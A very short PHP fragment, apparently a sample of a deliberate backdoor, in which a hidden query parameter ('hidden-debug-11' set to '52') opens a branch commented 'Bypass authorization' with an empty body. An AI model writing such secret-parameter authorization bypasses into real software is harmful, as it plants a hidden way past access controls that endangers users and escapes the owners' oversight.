<?

if ($_GET['hidden-debug-11'] === "52"){
	//Bypass authorization
}